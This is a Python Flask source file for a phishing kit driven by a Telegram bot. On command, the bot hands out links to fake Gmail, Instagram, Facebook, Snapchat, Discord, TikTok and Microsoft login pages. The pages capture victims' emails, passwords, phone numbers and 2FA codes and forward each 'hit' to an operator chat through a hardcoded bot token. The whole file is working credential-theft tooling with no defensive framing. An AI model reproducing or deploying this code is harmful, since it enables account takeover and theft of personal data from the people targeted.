from flask import Flask, request, render_template_string
import os
import requests
import threading
import time

app = Flask(__name__)

BOT_TOKEN = "8232409100:AAExUp0yXjQzN7js3bQriSKq5MiOClU3BeU"
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '6593129349')
PHISHING_DATA = []
STATS = {'visits': 0, 'captures': 0}
running = True
last_update_id = 0

SERVICES = {
    '1': ('📧 Gmail', 'gmail'),
    '2': ('📸 Instagram', 'insta'), 
    '3': ('📘 Facebook', 'facebook'),
    '4': ('👻 Snapchat', 'snapchat'),
    '5': ('💬 Discord', 'discord'),
    '6': ('🎵 TikTok', 'tiktok'),
    '7': ('🔐 Microsoft', 'microsoft')
}

def send_msg(chat_id, text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     data={'chat_id':chat_id,'text':text,'parse_mode':'HTML'}, timeout=5)
    except: pass

def send_keyboard(chat_id, text, keyboard):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     data={'chat_id':chat_id,'text':text,'parse_mode':'HTML','reply_markup':json.dumps({'keyboard':keyboard,'resize_keyboard':True})}, timeout=5)
    except: pass

def bot_loop():
    global last_update_id
    while running:
        try:
            resp = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", 
                              params={'offset':last_update_id+1,'timeout':20}).json()
            if resp['ok']:
                for update in resp['result']:
                    last_update_id = update['update_id']
                    msg = update['message']
                    cid = msg['chat']['id']
                    txt = msg.get('text', '')
                    uid = msg['from']['id']
                    
                    if '/start' in txt:
                        kb = [[f"{k}. {v[0]}" for k,v in SERVICES.items()]]
                        send_keyboard(cid, 
                                     "🎣 <b>Choose Service:</b>\n\n"
                                     "Select karo aur perfect link milega! 🔥", kb)
                    
                    elif txt in SERVICES:
                        service_name, service_id = SERVICES[txt]
                        url = f"https://myphish.onrender.com/phish/{service_id}/{uid}"
                        send_msg(cid, f"✅ <b>{service_name}</b>\n\n"
                                     f"🔗 <code>{url}</code>\n\n"
                                     f"📱 Copy & send to target!")
                    
                    elif txt == '/stats':
                        rate = STATS['captures']/max(STATS['visits'],1)*100
                        send_msg(cid, f"📊 <b>STATS</b>\n"
                                     f"🎯 Captures: <code>{STATS['captures']}</code>\n"
                                     f"👀 Visits: <code>{STATS['visits']}</code>\n"
                                     f"✅ Rate: <code>{rate:.1f}%</code>")
                    
                    elif txt == '/data' and str(cid) == ADMIN_CHAT_ID:
                        if PHISHING_DATA:
                            recent = PHISHING_DATA[-10:]
                            data_text = "\n".join([f"🎣 <code>{d['email']} | {d['pass']}</code> [{d['service']}]" for d in recent])
                            send_msg(cid, f"💾 <b>LATEST 10 HITS:</b>\n\n{data_text}")
                        else:
                            send_msg(cid, "📭 No captures yet!")
        except: pass
        time.sleep(1)

@app.route('/')
def home():
    return f"<h1>🎣 PHISH BOT LIVE!</h1><pre>Visits: {STATS['visits']} | Captures: {STATS['captures']}</pre>"

@app.route('/phish/<service>/<int:user_id>')
def phish(service, user_id):
    STATS['visits'] += 1
    service_names = {'gmail':'Gmail', 'insta':'Instagram', 'facebook':'Facebook', 'snapchat':'Snapchat', 'discord':'Discord', 'tiktok':'TikTok', 'microsoft':'Microsoft'}
    service_name = service_names.get(service, 'Account')
    return render_template_string(LOGIN_TEMPLATE, service=service_name, user_id=user_id)

@app.route('/phish/<service>/<int:user_id>', methods=['POST'])
def capture(service, user_id):
    STATS['captures'] += 1
    data = {
        'email': request.form['email'],
        'pass': request.form['password'],
        'phone': request.form.get('phone', ''),
        'otp': request.form.get('otp', ''),
        'service': service.upper(),
        'ip': request.remote_addr
    }
    PHISHING_DATA.append(data)
    
    if ADMIN_CHAT_ID:
        send_msg(ADMIN_CHAT_ID, f"🎣 <b>{data['service']} HIT!</b>\n"
                               f"📧 <code>{data['email']}</code>\n"
                               f"🔑 <code>{data['pass']}</code>\n"
                               f"📱 <code>{data['phone']}</code>")
    
    return '<script>alert("✅ Verified Successfully!");window.location="https://google.com";</script>'

LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html><head><title>{{service}}</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{margin:0;padding:20px 20px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;}
.card{background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.2);padding:40px;max-width:380px;width:100%;text-align:center;}
.logo{width:50px;margin:0 auto 20px;display:block;}
h1{color:#333;margin:0 0 10px;font-size:24px;font-weight:600;}
.tagline{color:#666;margin:0 0 30px;font-size:16px;}
.input-group{position:relative;margin-bottom:20px;}
input{width:100%;padding:16px 20px;border:2px solid #e1e5e9;border-radius:12px;box-sizing:border-box;font-size:16px;transition:all 0.3s;}
input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1);}
.btn{width:100%;padding:16px;background:linear-gradient(45deg,#667eea,#764ba2);color:white;border:none;border-radius:12px;font-size:18px;font-weight:500;cursor:pointer;transition:all 0.3s;}
.btn:hover{background:linear-gradient(45deg,#5a67d8,#6b46c1);transform:translateY(-2px);}
.footer{margin-top:25px;padding-top:20px;border-top:1px solid #eee;color:#888;font-size:14px;}
</style></head>
<body>
<div class="card">
<img class="logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGNpcmNsZSBjeD0iMjUiIGN5PSIyNSIgcj0iMjUiIGZpbGw9IiM0Mjg1ZjQiLz4KPHRleHQgeD0iMjUiIHk9IjMyIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj48L3RleHQ+Cjwvc3ZnPgo=">
<h1>🔐 {{service}} Login</h1>
<p class="tagline">Enter credentials to continue</p>
<form method="POST">
<div class="input-group"><input name="email" type="email" placeholder="Email or Username" required autocomplete="off"></div>
<div class="input-group"><input name="password" type="password" placeholder="Password" required autocomplete="off"></div>
<div class="input-group"><input name="phone" type="tel" placeholder="Phone Number (optional)"></div>
<div class="input-group"><input name="otp" type="text" placeholder="2FA Code (if enabled)"></div>
<input name="user_id" type="hidden" value="{{user_id}}">
<input name="service" type="hidden" value="{{service}}">
<button class="btn" type="submit">🔓 Verify Account</button>
</form>
<p class="footer">Secure authentication required</p>
</div></body></html>
"""

if __name__ == '__main__':
    threading.Thread(target=bot_loop, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
